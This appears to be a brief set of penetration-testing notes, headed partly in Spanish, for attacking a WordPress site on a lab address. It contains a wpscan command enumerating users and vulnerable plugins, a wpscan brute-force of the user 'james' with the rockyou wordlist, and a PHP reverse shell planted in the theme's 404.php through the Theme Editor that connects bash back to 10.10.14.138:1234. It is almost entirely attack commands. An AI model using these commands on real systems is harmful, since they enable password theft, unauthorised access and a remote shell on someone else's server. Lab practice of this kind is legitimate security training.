
```bash
wpscan --url "http://10.10.110.100:65000/wordpress/" --disable-tls-checks --api-token "" --enumerate u,vp --plugins-detection aggressive --force
```

- Fuera Bruta
```bash
wpscan --url "http://10.10.110.100:65000/wordpress/" --disable-tls-checks -U james --passwords /usr/share/wordlists/rockyou.txt -t 50
```

- Revshell
```bash
Theme Editor > 404.php :
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.138/1234 0>&1'"); ?>
#Acceder a:
/wordpress/wpcontent/themes/twentynineteen/404.php
```
